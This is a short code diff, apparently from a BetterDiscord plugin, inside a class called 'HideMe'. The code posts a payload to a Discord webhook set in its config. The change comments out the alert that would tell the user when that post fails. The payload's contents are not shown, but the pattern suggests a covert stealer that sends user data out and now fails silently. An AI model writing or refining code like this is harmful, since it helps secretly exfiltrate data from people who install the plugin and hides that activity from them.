@@ -165,7 +165,7 @@ class HideMe {
 
         var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
         SendToWebhook.on('error', (e) => {
-            BdApi.alert(e);
+            //BdApi.alert(e);
             //console.error(e);
         });
         SendToWebhook.write(pD);
